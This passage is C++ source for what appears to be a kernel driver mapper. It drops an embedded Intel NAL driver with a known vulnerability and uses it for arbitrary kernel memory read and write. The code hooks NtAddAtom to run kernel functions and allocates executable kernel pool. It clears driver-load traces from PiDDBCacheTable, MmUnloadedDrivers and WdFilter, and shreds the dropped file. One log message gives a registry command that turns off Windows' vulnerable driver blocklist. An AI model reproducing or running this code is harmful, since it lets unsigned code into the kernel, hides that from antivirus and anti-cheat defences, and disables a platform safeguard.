#include "intel_nal.hpp"
#include "logger.hpp"
#include "nt_utils.hpp"
#include "resource.hpp"
#include <Windows.h>
#include <string>
#include <vector>
#include <fstream>
#include <cstdint>
#include <functional>
#include <memory>
#include <cwctype>
#include <cstring>
#include <iterator>

constexpr ULONG IOCTL_INTEL = 0x80862007;

struct CopyMemBuf {
    uint64_t case_number;
    uint64_t reserved;
    uint64_t source;
    uint64_t destination;
    uint64_t length;
};

struct FillMemBuf {
    uint64_t case_number;
    uint64_t reserved1;
    uint32_t value;
    uint32_t reserved2;
    uint64_t destination;
    uint64_t length;
};

struct GetPhysBuf {
    uint64_t case_number;
    uint64_t reserved;
    uint64_t return_physical_address;
    uint64_t address_to_translate;
};

struct MapIoBuf {
    uint64_t case_number;
    uint64_t reserved;
    uint64_t return_value;
    uint64_t return_virtual_address;
    uint64_t physical_address_to_map;
    uint32_t size;
};

struct UnmapIoBuf {
    uint64_t case_number;
    uint64_t reserved1;
    uint64_t reserved2;
    uint64_t virt_address;
    uint64_t reserved3;
    uint32_t number_of_bytes;
};

struct StaleHelperService {
    std::wstring name;
    std::wstring image_path;
};

static bool iequals_ascii(const std::wstring& a, const std::wstring& b) {
    if (a.size() != b.size()) return false;
    for (size_t i = 0; i < a.size(); ++i) {
        if (std::towlower(a[i]) != std::towlower(b[i])) return false;
    }
    return true;
}

static bool istarts_with_ascii(const std::wstring& value, const std::wstring& prefix) {
    if (value.size() < prefix.size()) return false;
    for (size_t i = 0; i < prefix.size(); ++i) {
        if (std::towlower(value[i]) != std::towlower(prefix[i])) return false;
    }
    return true;
}

static std::wstring normalize_image_path(const std::wstring& raw) {
    std::wstring path = raw;
    if (istarts_with_ascii(path, L"\\??\\")) {
        path = path.substr(4);
    } else if (istarts_with_ascii(path, L"\\\\?\\")) {
        path = path.substr(4);
    }

    wchar_t expanded[MAX_PATH * 4] = {};
    DWORD len = ExpandEnvironmentStringsW(path.c_str(), expanded, static_cast<DWORD>(std::size(expanded)));
    if (len > 0 && len < std::size(expanded)) {
        path.assign(expanded);
    }

    while (!path.empty() && path.front() == L'"') path.erase(path.begin());
    while (!path.empty() && path.back() == L'"') path.pop_back();
    return path;
}

static bool is_alpha_service_name(const std::wstring& name) {
    if (name.length() < 10 || name.length() > 30) return false;
    for (wchar_t ch : name) {
        if (!((ch >= L'a' && ch <= L'z') || (ch >= L'A' && ch <= L'Z'))) return false;
    }
    return true;
}

static bool query_registry_dword(HKEY key, const wchar_t* value_name, DWORD* out) {
    DWORD type = 0;
    DWORD size = sizeof(DWORD);
    return RegQueryValueExW(key, value_name, nullptr, &type, reinterpret_cast<BYTE*>(out), &size) == ERROR_SUCCESS &&
        type == REG_DWORD && size == sizeof(DWORD);
}

static bool query_registry_string(HKEY key, const wchar_t* value_name, std::wstring* out) {
    DWORD type = 0;
    DWORD bytes = 0;
    LSTATUS st = RegQueryValueExW(key, value_name, nullptr, &type, nullptr, &bytes);
    if (st != ERROR_SUCCESS || bytes < sizeof(wchar_t)) return false;
    if (type != REG_SZ && type != REG_EXPAND_SZ) return false;

    std::vector<wchar_t> buf((bytes / sizeof(wchar_t)) + 1);
    st = RegQueryValueExW(key, value_name, nullptr, &type, reinterpret_cast<BYTE*>(buf.data()), &bytes);
    if (st != ERROR_SUCCESS) return false;
    buf.back() = L'\0';
    out->assign(buf.data());
    return true;
}

static std::wstring basename_without_ext(const std::wstring& path) {
    size_t slash = path.find_last_of(L"\\/");
    std::wstring name = slash == std::wstring::npos ? path : path.substr(slash + 1);
    size_t dot = name.find_last_of(L'.');
    return dot == std::wstring::npos ? name : name.substr(0, dot);
}

static bool helper_file_matches_embedded_driver(const std::wstring& path) {
    DWORD attrs = GetFileAttributesW(path.c_str());
    if (attrs == INVALID_FILE_ATTRIBUTES || (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
        return true;
    }

    std::ifstream f(path, std::ios::binary | std::ios::ate);
    if (!f) return false;
    std::streamoff size = f.tellg();
    if (size != static_cast<std::streamoff>(sizeof(gsd_mapper_resource::driver))) {
        return false;
    }

    std::vector<char> data(static_cast<size_t>(size));
    f.seekg(0, std::ios::beg);
    f.read(data.data(), size);
    return f.good() &&
        std::memcmp(data.data(), gsd_mapper_resource::driver, sizeof(gsd_mapper_resource::driver)) == 0;
}

static std::vector<StaleHelperService> find_stale_helper_services(const std::wstring& temp_path) {
    std::vector<StaleHelperService> found;
    HKEY services = nullptr;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services", 0, KEY_READ, &services) != ERROR_SUCCESS) {
        return found;
    }

    DWORD index = 0;
    wchar_t name_buf[256] = {};
    DWORD name_len = static_cast<DWORD>(std::size(name_buf));
    while (RegEnumKeyExW(services, index++, name_buf, &name_len, nullptr, nullptr, nullptr, nullptr) == ERROR_SUCCESS) {
        std::wstring service_name(name_buf, name_len);
        name_len = static_cast<DWORD>(std::size(name_buf));
        if (!is_alpha_service_name(service_name)) continue;

        HKEY service = nullptr;
        if (RegOpenKeyExW(services, service_name.c_str(), 0, KEY_READ, &service) != ERROR_SUCCESS) {
            continue;
        }

        DWORD type = 0;
        std::wstring image_path_raw;
        bool ok = query_registry_dword(service, L"Type", &type) &&
            type == SERVICE_KERNEL_DRIVER &&
            query_registry_string(service, L"ImagePath", &image_path_raw);
        RegCloseKey(service);
        if (!ok) continue;

        std::wstring image_path = normalize_image_path(image_path_raw);
        if (!istarts_with_ascii(image_path, temp_path + L"\\")) continue;
        if (!iequals_ascii(basename_without_ext(image_path), service_name)) continue;
        if (!helper_file_matches_embedded_driver(image_path)) continue;

        found.push_back({ service_name, image_path });
    }

    RegCloseKey(services);
    return found;
}

gsd::IntelNalBackend::~IntelNalBackend() {
    if (loaded) unload();
}

bool gsd::IntelNalBackend::device_io(DWORD ioctl, void* in_buf, DWORD in_size, void* out_buf, DWORD out_size) {
    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) return false;
    DWORD ret = 0;
    return DeviceIoControl(hDevice, ioctl, in_buf, in_size, out_buf, out_size, &ret, nullptr) != 0;
}

bool gsd::IntelNalBackend::mem_copy(uint64_t dst, uint64_t src, uint64_t size) {
    if (!dst || !src || !size) return false;
    CopyMemBuf buf = {};
    buf.case_number = 0x33;
    buf.source = src;
    buf.destination = dst;
    buf.length = size;
    return device_io(IOCTL_INTEL, &buf, sizeof(buf), nullptr, 0);
}

bool gsd::IntelNalBackend::read(uint64_t addr, void* buf, uint64_t size) {
    return mem_copy(reinterpret_cast<uint64_t>(buf), addr, size);
}

bool gsd::IntelNalBackend::write(uint64_t addr, const void* buf, uint64_t size) {
    return mem_copy(addr, reinterpret_cast<uint64_t>(buf), size);
}

bool gsd::IntelNalBackend::read_ro(uint64_t addr, void* buf, uint32_t size) {
    if (!addr || !buf || !size) return false;
    GetPhysBuf phys = {};
    phys.case_number = 0x25;
    phys.address_to_translate = addr;
    if (!device_io(IOCTL_INTEL, &phys, sizeof(phys), nullptr, 0)) return false;
    uint64_t phys_addr = phys.return_physical_address;
    if (!phys_addr) return false;

    MapIoBuf map = {};
    map.case_number = 0x19;
    map.physical_address_to_map = phys_addr;
    map.size = size;
    if (!device_io(IOCTL_INTEL, &map, sizeof(map), nullptr, 0)) return false;
    if (!map.return_virtual_address) return false;

    bool ok = read(map.return_virtual_address, buf, size);

    UnmapIoBuf unmap = {};
    unmap.case_number = 0x1A;
    unmap.virt_address = map.return_virtual_address;
    unmap.number_of_bytes = size;
    device_io(IOCTL_INTEL, &unmap, sizeof(unmap), nullptr, 0);
    return ok;
}

bool gsd::IntelNalBackend::write_to_ro(uint64_t addr, const void* buf, uint32_t size) {
    if (!addr || !buf || !size) return false;
    GetPhysBuf phys = {};
    phys.case_number = 0x25;
    phys.address_to_translate = addr;
    if (!device_io(IOCTL_INTEL, &phys, sizeof(phys), nullptr, 0)) return false;
    uint64_t phys_addr = phys.return_physical_address;
    if (!phys_addr) return false;

    MapIoBuf map = {};
    map.case_number = 0x19;
    map.physical_address_to_map = phys_addr;
    map.size = size;
    if (!device_io(IOCTL_INTEL, &map, sizeof(map), nullptr, 0)) return false;
    if (!map.return_virtual_address) return false;

    bool ok = write(map.return_virtual_address, buf, size);

    UnmapIoBuf unmap = {};
    unmap.case_number = 0x1A;
    unmap.virt_address = map.return_virtual_address;
    unmap.number_of_bytes = size;
    device_io(IOCTL_INTEL, &unmap, sizeof(unmap), nullptr, 0);
    return ok;
}

bool gsd::IntelNalBackend::resolve_relative_addr_kernel(uint64_t instruction, ULONG offset_offset, ULONG instruction_size, uint64_t* out) {
    if (!instruction || !out) return false;
    LONG rip_offset = 0;
    if (!read(instruction + offset_offset, &rip_offset, sizeof(rip_offset))) return false;
    *out = instruction + instruction_size + rip_offset;
    return true;
}

bool gsd::IntelNalBackend::acquire_debug_priv() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return false;
    auto fn = reinterpret_cast<decltype(&ntdefs::RtlAdjustPrivilege)>(GetProcAddress(ntdll, "RtlAdjustPrivilege"));
    if (!fn) return false;
    BOOLEAN was = FALSE;
    return NT_SUCCESS(fn(20, TRUE, FALSE, &was)); // SeDebugPrivilege
}

bool gsd::IntelNalBackend::acquire_load_driver_priv() {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return false;
    auto fn = reinterpret_cast<decltype(&ntdefs::RtlAdjustPrivilege)>(GetProcAddress(ntdll, "RtlAdjustPrivilege"));
    if (!fn) return false;
    BOOLEAN was = FALSE;
    return NT_SUCCESS(fn(10, TRUE, FALSE, &was)); // SeLoadDriverPrivilege
}

bool gsd::IntelNalBackend::cleanup_stale_helper_driver() {
    std::wstring temp_path = kutil::get_temp_path();
    if (temp_path.empty()) return false;

    if (!acquire_load_driver_priv()) {
        gsd_log::warn(L"Cannot acquire SeLoadDriverPrivilege for stale helper cleanup.");
        return false;
    }

    auto stale_services = find_stale_helper_services(temp_path);
    if (stale_services.empty()) {
        gsd_log::warn(L"No matching stale helper service found in the registry.");
        return false;
    }

    bool attempted = false;
    for (const auto& svc : stale_services) {
        attempted = true;
        gsd_log::warn(L"Removing stale Intel NAL helper service: " + svc.name);

        std::wstring regPath = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + svc.name;
        UNICODE_STRING uStr;
        RtlInitUnicodeString(&uStr, regPath.c_str());
        NTSTATUS unload_status = ntdefs::NtUnloadDriver(&uStr);
        if (NT_SUCCESS(unload_status)) {
            gsd_log::info(L"Stale helper unloaded: " + svc.name);
        } else {
            gsd_log::warn(L"NtUnloadDriver for stale helper returned " + gsd_log::hex_status(unload_status));
        }

        std::wstring svcPath = L"SYSTEM\\CurrentControlSet\\Services\\" + svc.name;
        LSTATUS del_status = RegDeleteTreeW(HKEY_LOCAL_MACHINE, svcPath.c_str());
        if (del_status != ERROR_SUCCESS && del_status != ERROR_FILE_NOT_FOUND) {
            gsd_log::warn(L"Failed to delete stale helper service key: " + std::to_wstring(del_status));
        }

        if (!svc.image_path.empty()) {
            DeleteFileW(svc.image_path.c_str());
        }
    }

    Sleep(500);
    HANDLE hTest = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hTest && hTest != INVALID_HANDLE_VALUE) {
        CloseHandle(hTest);
        gsd_log::err(L"Intel NAL device is still present after stale helper cleanup.");
        return false;
    }

    return attempted;
}

bool gsd::IntelNalBackend::load() {
    // Check if already running
    HANDLE hTest = CreateFileW(L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (hTest && hTest != INVALID_HANDLE_VALUE) {
        CloseHandle(hTest);
        gsd_log::warn(L"Intel NAL device is already in use. Attempting stale helper cleanup...");
        if (!cleanup_stale_helper_driver()) {
            gsd_log::err(L"Intel NAL device is already in use. Restart PC if a previous mapper crashed.");
            return false;
        }
    }

    service_name = kutil::random_name();
    std::wstring temp_path = kutil::get_temp_path();
    if (temp_path.empty()) {
        gsd_log::err(L"Cannot determine TEMP path.");
        return false;
    }
    driver_path = temp_path + L"\\" + service_name + L".sys";

    DeleteFileW(driver_path.c_str());
    if (!kutil::write_file(driver_path, gsd_mapper_resource::driver, sizeof(gsd_mapper_resource::driver))) {
        gsd_log::err(L"Failed to write helper driver to disk.");
        return false;
    }

    if (!acquire_debug_priv()) {
        gsd_log::warn(L"Failed to acquire SeDebugPrivilege.");
    }
    if (!acquire_load_driver_priv()) {
        gsd_log::err(L"Failed to acquire SeLoadDriverPrivilege. Run as Administrator.");
        DeleteFileW(driver_path.c_str());
        return false;
    }

    // Create registry key and load driver
    std::wstring svcPath = L"SYSTEM\\CurrentControlSet\\Services\\" + service_name;
    std::wstring imgPath = L"\\??\\" + driver_path;
    HKEY hKey = nullptr;
    LSTATUS st = RegCreateKeyW(HKEY_LOCAL_MACHINE, svcPath.c_str(), &hKey);
    if (st != ERROR_SUCCESS) {
        gsd_log::err(L"RegCreateKeyW failed: " + std::to_wstring(st));
        DeleteFileW(driver_path.c_str());
        return false;
    }
    DWORD type = SERVICE_KERNEL_DRIVER;
    LSTATUS img_status = RegSetValueExW(hKey, L"ImagePath", 0, REG_EXPAND_SZ, reinterpret_cast<const BYTE*>(imgPath.c_str()), static_cast<DWORD>((imgPath.size() + 1) * sizeof(wchar_t)));
    LSTATUS type_status = RegSetValueExW(hKey, L"Type", 0, REG_DWORD, reinterpret_cast<const BYTE*>(&type), sizeof(type));
    RegCloseKey(hKey);
    if (img_status != ERROR_SUCCESS || type_status != ERROR_SUCCESS) {
        gsd_log::err(L"Failed to write service registry values.");
        RegDeleteTreeW(HKEY_LOCAL_MACHINE, svcPath.c_str());
        DeleteFileW(driver_path.c_str());
        return false;
    }

    std::wstring regPath = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + service_name;
    UNICODE_STRING uStr;
    RtlInitUnicodeString(&uStr, regPath.c_str());
    NTSTATUS ntst = ntdefs::NtLoadDriver(&uStr);
    if (!NT_SUCCESS(ntst)) {
        gsd_log::err(L"NtLoadDriver failed: " + gsd_log::hex_status(ntst));
        if (ntst == STATUS_IMAGE_CERT_REVOKED) {
            gsd_log::err(L"Driver blocklist is enabled. Disable it:");
            gsd_log::err(L"reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config /v VulnerableDriverBlocklistEnable /t REG_DWORD /d 0 /f");
        } else if (ntst == STATUS_OBJECT_NAME_INVALID) {
            gsd_log::err(L"Helper driver ImagePath was rejected by the kernel.");
            gsd_log::err(L"ImagePath: " + imgPath);
        }
        RegDeleteTreeW(HKEY_LOCAL_MACHINE, svcPath.c_str());
        DeleteFileW(driver_path.c_str());
        return false;
    }

    hDevice = CreateFileW(L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
    if (!hDevice || hDevice == INVALID_HANDLE_VALUE) {
        gsd_log::err(L"Failed to open Intel NAL device.");
        unload();
        return false;
    }

    ntoskrnl_base = kutil::get_kernel_module_base("ntoskrnl.exe");
    if (!ntoskrnl_base) {
        gsd_log::err(L"Failed to locate ntoskrnl.exe in kernel.");
        unload();
        return false;
    }

    IMAGE_DOS_HEADER dos = {};
    if (!read(ntoskrnl_base, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE) {
        gsd_log::err(L"ntoskrnl.exe MZ check failed — AC/AV may be blocking reads.");
        unload();
        return false;
    }

    gsd_log::info(L"Helper driver loaded and device opened.");

    gsd_log::detail(L"Cleaning PiDDBCacheTable...");
    if (!clear_piddb()) gsd_log::warn(L"PiDDBCacheTable cleanup failed.");
    gsd_log::detail(L"Cleaning KernelHashBucketList...");
    if (!clear_hash_bucket()) gsd_log::warn(L"HashBucketList cleanup failed.");
    gsd_log::detail(L"Cleaning MmUnloadedDrivers...");
    if (!clear_mm_unloaded()) gsd_log::warn(L"MmUnloadedDrivers cleanup failed.");
    gsd_log::detail(L"Cleaning WdFilter runtime list...");
    if (!clear_wdfilter()) gsd_log::warn(L"WdFilter cleanup failed.");

    loaded = true;
    return true;
}

bool gsd::IntelNalBackend::unload() {
    if (hDevice && hDevice != INVALID_HANDLE_VALUE) {
        CloseHandle(hDevice);
        hDevice = INVALID_HANDLE_VALUE;
    }

    if (!service_name.empty()) {
        std::wstring regPath = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + service_name;
        UNICODE_STRING uStr;
        RtlInitUnicodeString(&uStr, regPath.c_str());
        ntdefs::NtUnloadDriver(&uStr);

        std::wstring svcPath = L"SYSTEM\\CurrentControlSet\\Services\\" + service_name;
        RegDeleteTreeW(HKEY_LOCAL_MACHINE, svcPath.c_str());
    }

    if (!driver_path.empty()) {
        // overwrite with random data before delete
        std::ofstream f(driver_path.c_str(), std::ios::binary | std::ios::trunc);
        if (f) {
            size_t sz = sizeof(gsd_mapper_resource::driver) + (rand() % 2000000 + 1000);
            std::vector<char> junk(sz);
            for (auto& c : junk) c = static_cast<char>(rand() % 256);
            f.write(junk.data(), junk.size());
        }
        DeleteFileW(driver_path.c_str());
    }

    loaded = false;
    return true;
}

uint64_t gsd::IntelNalBackend::allocate_pool(uint64_t size) {
    if (!size) return 0;
    static uint64_t fn_alloc = 0;
    if (!fn_alloc) fn_alloc = resolve_export(ntoskrnl_base, "ExAllocatePool2");
    if (!fn_alloc) fn_alloc = resolve_export(ntoskrnl_base, "ExAllocatePoolWithTag");
    if (!fn_alloc) {
        gsd_log::err(L"Failed to resolve ExAllocatePool2/ExAllocatePoolWithTag");
        return 0;
    }
    uint64_t result = 0;
    // ExAllocatePool2(PoolFlags, NumberOfBytes, Tag)
    // POOL_FLAG_NON_PAGED is NX. Mapped driver code must be executable.
    // Fallback: ExAllocatePoolWithTag(NonPagedPool, size, tag)
    ULONG tag = 'BwtE';
    if (fn_alloc == resolve_export(ntoskrnl_base, "ExAllocatePool2")) {
        // Modern path
        constexpr uint64_t pool_flags = 0x80; // POOL_FLAG_NON_PAGED_EXECUTE
        if (!call_function(fn_alloc, &result, { pool_flags, size, tag })) return 0;
    } else {
        // Legacy path
        uint64_t pool_type = 0; // NonPagedPool
        if (!call_function(fn_alloc, &result, { pool_type, size, tag })) return 0;
    }
    return result;
}

bool gsd::IntelNalBackend::free_pool(uint64_t addr) {
    if (!addr) return false;
    static uint64_t fn_free = 0;
    if (!fn_free) fn_free = resolve_export(ntoskrnl_base, "ExFreePool");
    if (!fn_free) {
        gsd_log::err(L"Failed to resolve ExFreePool");
        return false;
    }
    return call_function(fn_free, nullptr, { addr });
}

bool gsd::IntelNalBackend::find_MmAllocateIndependentPagesEx() {
    if (addr_MmAllocateIndependentPagesEx) return true;
    // Pattern: 41 8B D6 B9 00 10 00 00 E8 ?? ?? ?? ?? 48 8B D8
    uint8_t mask[] = { 0x41, 0x8B, 0xD6, 0xB9, 0x00, 0x10, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xD8 };
    const char* pat = "xxxxxxxxx????xxx";
    uint64_t addr = find_pattern_in_kernel_section(".text", ntoskrnl_base, mask, pat);
    if (!addr) return false;
    addr += 8;
    return resolve_relative_addr_kernel(addr, 1, 5, &addr_MmAllocateIndependentPagesEx);
}

bool gsd::IntelNalBackend::find_MmFreeIndependentPages() {
    if (addr_MmFreeIndependentPages) return true;
    uint8_t mask1[] = { 0xBA, 0x00, 0x60, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8B, 0x00, 0xF0, 0xFF, 0xFF };
    const char* pat1 = "xxxxxxxxx????xxxxxxx";
    uint64_t addr = find_pattern_in_kernel_section("PAGE", ntoskrnl_base, mask1, pat1);
    if (addr) {
        addr += 8;
    } else {
        uint8_t mask2[] = { 0x8B, 0x15, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xCB, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8B };
        const char* pat2 = "xx????xxxx????xxx";
        addr = find_pattern_in_kernel_section("PAGE", ntoskrnl_base, mask2, pat2);
        if (!addr) return false;
        addr += 9;
    }
    return resolve_relative_addr_kernel(addr, 1, 5, &addr_MmFreeIndependentPages);
}

bool gsd::IntelNalBackend::find_MmSetPageProtection() {
    if (addr_MmSetPageProtection) return true;
    uint8_t mask1[] = { 0x0F, 0x45, 0x00, 0x00, 0x8D, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xE8 };
    const char* pat1 = "xx??x???xxx";
    uint64_t addr = find_pattern_in_kernel_section("PAGELK", ntoskrnl_base, mask1, pat1);
    if (addr) {
        addr += 10;
    } else {
        uint8_t mask2[] = { 0x0F, 0x45, 0x00, 0x00, 0x45, 0x8B, 0x00, 0x00, 0x00, 0x00, 0x8D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xE8 };
        const char* pat2 = "xx??xx????x???xxx";
        addr = find_pattern_in_kernel_section("PAGELK", ntoskrnl_base, mask2, pat2);
        if (!addr) return false;
        addr += 13;
    }
    return resolve_relative_addr_kernel(addr, 1, 5, &addr_MmSetPageProtection);
}

uint64_t gsd::IntelNalBackend::allocate_independent_pages(uint32_t size) {
    if (!find_MmAllocateIndependentPagesEx()) {
        gsd_log::err(L"MmAllocateIndependentPagesEx not found.");
        return 0;
    }
    uint64_t result = 0;
    if (!call_function(addr_MmAllocateIndependentPagesEx, &result, { size, static_cast<uint64_t>(-1), 0, 0 })) return 0;
    return result;
}

bool gsd::IntelNalBackend::free_independent_pages(uint64_t addr, uint32_t size) {
    if (!find_MmFreeIndependentPages()) {
        gsd_log::err(L"MmFreeIndependentPages not found.");
        return false;
    }
    uint64_t result = 0;
    return call_function(addr_MmFreeIndependentPages, &result, { addr, size });
}

bool gsd::IntelNalBackend::set_page_protection(uint64_t addr, uint32_t size, ULONG prot) {
    if (!find_MmSetPageProtection()) {
        gsd_log::err(L"MmSetPageProtection not found.");
        return false;
    }
    BOOLEAN result = FALSE;
    if (!call_function(addr_MmSetPageProtection, reinterpret_cast<uint64_t*>(&result), { addr, size, prot })) return false;
    return result != 0;
}

bool gsd::IntelNalBackend::call_function(uint64_t fn_addr, uint64_t* out_result, const std::vector<uint64_t>& args) {
    if (!fn_addr) return false;
    if (args.size() > 4) {
        gsd_log::err(L"call_function: max 4 args supported.");
        return false;
    }

    if (!fn_NtAddAtom) {
        fn_NtAddAtom = resolve_export(ntoskrnl_base, "NtAddAtom");
        if (!fn_NtAddAtom) {
            gsd_log::err(L"Failed to resolve NtAddAtom in kernel.");
            return false;
        }
        if (!read(fn_NtAddAtom, orig_NtAddAtom, sizeof(orig_NtAddAtom))) {
            gsd_log::err(L"Failed to read original NtAddAtom bytes.");
            return false;
        }
        uint8_t check[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
        if (memcmp(orig_NtAddAtom, check, 2) == 0 && memcmp(orig_NtAddAtom + 10, check + 10, 2) == 0) {
            gsd_log::err(L"NtAddAtom is already hooked — another mapper running?");
            return false;
        }
    }

    uint8_t hook[] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
    *reinterpret_cast<uint64_t*>(hook + 2) = fn_addr;

    if (!write_to_ro(fn_NtAddAtom, hook, sizeof(hook))) {
        gsd_log::err(L"Failed to write NtAddAtom hook.");
        return false;
    }

    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    auto user_NtAddAtom = reinterpret_cast<uint64_t(__stdcall*)(uint64_t, uint64_t, uint64_t, uint64_t)>(GetProcAddress(ntdll, "NtAddAtom"));

    uint64_t arg0 = args.size() > 0 ? args[0] : 0;
    uint64_t arg1 = args.size() > 1 ? args[1] : 0;
    uint64_t arg2 = args.size() > 2 ? args[2] : 0;
    uint64_t arg3 = args.size() > 3 ? args[3] : 0;

    uint64_t local_result = user_NtAddAtom(arg0, arg1, arg2, arg3);

    if (!write_to_ro(fn_NtAddAtom, orig_NtAddAtom, sizeof(orig_NtAddAtom))) {
        gsd_log::err(L"Failed to restore NtAddAtom bytes!");
    }

    if (out_result) *out_result = local_result;
    return true;
}

uint64_t gsd::IntelNalBackend::resolve_export(uint64_t module_base, const std::string& name) {
    if (!module_base) return 0;
    IMAGE_DOS_HEADER dos = {};
    if (!read(module_base, &dos, sizeof(dos)) || dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;
    IMAGE_NT_HEADERS64 nt = {};
    if (!read(module_base + dos.e_lfanew, &nt, sizeof(nt)) || nt.Signature != IMAGE_NT_SIGNATURE) return 0;

    auto export_dir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (!export_dir.VirtualAddress || !export_dir.Size) return 0;

    std::vector<BYTE> exp_buf(export_dir.Size);
    if (!read(module_base + export_dir.VirtualAddress, exp_buf.data(), export_dir.Size)) return 0;

    auto* exp = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(exp_buf.data());
    auto delta = reinterpret_cast<uint64_t>(exp_buf.data()) - export_dir.VirtualAddress;

    auto names = reinterpret_cast<uint32_t*>(exp->AddressOfNames + delta);
    auto ords = reinterpret_cast<uint16_t*>(exp->AddressOfNameOrdinals + delta);
    auto funcs = reinterpret_cast<uint32_t*>(exp->AddressOfFunctions + delta);

    for (DWORD i = 0; i < exp->NumberOfNames; ++i) {
        const char* cur_name = reinterpret_cast<const char*>(names[i] + delta);
        if (_stricmp(cur_name, name.c_str()) == 0) {
            uint16_t ord = ords[i];
            if (funcs[ord] <= 0x1000) return 0;
            uint64_t addr = module_base + funcs[ord];
            if (addr >= module_base + export_dir.VirtualAddress && addr <= module_base + export_dir.VirtualAddress + export_dir.Size) return 0;
            return addr;
        }
    }
    return 0;
}

uint64_t gsd::IntelNalBackend::find_pattern_in_kernel_section(const char* section, uint64_t module_base, const uint8_t* mask, const char* pattern) {
    if (!module_base) return 0;

    std::vector<BYTE> headers(0x1000);
    if (!read(module_base, headers.data(), headers.size())) {
        gsd_log::warn(L"Failed to read kernel module headers.");
        return 0;
    }

    ULONG sec_size = 0;
    uint64_t local_sec = kutil::find_section(section, reinterpret_cast<uint64_t>(headers.data()), &sec_size);
    if (!local_sec || !sec_size) return 0;

    uint64_t sec_addr = module_base + (local_sec - reinterpret_cast<uint64_t>(headers.data()));
    if (!sec_addr || !sec_size) return 0;
    if (sec_size > 1024 * 1024 * 1024ULL) {
        gsd_log::warn(L"Kernel section is too large to scan.");
        return 0;
    }

    std::vector<BYTE> buf(sec_size);
    if (!read(sec_addr, buf.data(), sec_size)) return 0;
    uint64_t offset = kutil::find_pattern(reinterpret_cast<uint64_t>(buf.data()), sec_size, mask, pattern);
    if (!offset) return 0;
    return sec_addr + (offset - reinterpret_cast<uint64_t>(buf.data()));
}

uint64_t gsd::IntelNalBackend::get_ntoskrnl_base() {
    return ntoskrnl_base;
}

bool gsd::IntelNalBackend::clear_piddb() {
    if (!ntoskrnl_base) return false;

    // PiDDBLock patterns
    uint64_t piddb_lock_ptr = 0;
    uint64_t piddb_table_ptr = 0;

    uint8_t mask1[] = { 0x8B, 0xD8, 0x85, 0xC0, 0x0F, 0x88, 0x00, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x00, 0x00, 0x00, 0x00, 0x66, 0xFF, 0x88, 0x00, 0x00, 0x00, 0x00, 0xB2, 0x01, 0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x00, 0x24 };
    piddb_lock_ptr = find_pattern_in_kernel_section("PAGE", ntoskrnl_base, mask1, "xxxxxx????xxxxx????xxx????xxxxx????x????xx?x");
    int lock_offset = 28;
    if (!piddb_lock_ptr) {
        uint8_t mask2[] = { 0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x0F, 0x85, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, 0xE8, 0x00, 0x00, 0x00, 0x00, 0xE8 };
        piddb_lock_ptr = find_pattern_in_kernel_section("PAGE", ntoskrnl_base, mask2, "xxx????xxxxx????xxx????x????x");
        lock_offset = 16;
    }
    if (!piddb_lock_ptr) {
        uint8_t mask3[] = { 0x8B, 0xD8, 0x85, 0xC0, 0x0F, 0x88, 0x00, 0x00, 0x00, 0x00, 0x65, 0x48, 0x8B, 0x04, 0x25, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x00, 0x00, 0x00, 0x00, 0xB2, 0x01, 0x66, 0xFF, 0x88, 0x00, 0x00, 0x00, 0x00, 0x90, 0xE8, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x8B, 0x00, 0x24 };
        piddb_lock_ptr = find_pattern_in_kernel_section("PAGE", ntoskrnl_base, mask3, "xxxxxx????xxxxx????xxx????xxxxx????xx????xx?x");
        lock_offset = 19;
    }

    uint8_t tmask1[] = { 0x66, 0x03, 0xD2, 0x48, 0x8D, 0x0D };
    piddb_table_ptr = find_pattern_in_kernel_section("PAGE", ntoskrnl_base, tmask1, "xxxxxx");
    int table_offset = 6;
    if (!piddb_table_ptr) {
        uint8_t tmask2[] = { 0x48, 0x8B, 0xF9, 0x33, 0xC0, 0x48, 0x8D, 0x0D };
        piddb_table_ptr = find_pattern_in_kernel_section("PAGE", ntoskrnl_base, tmask2, "xxxxxxxx");
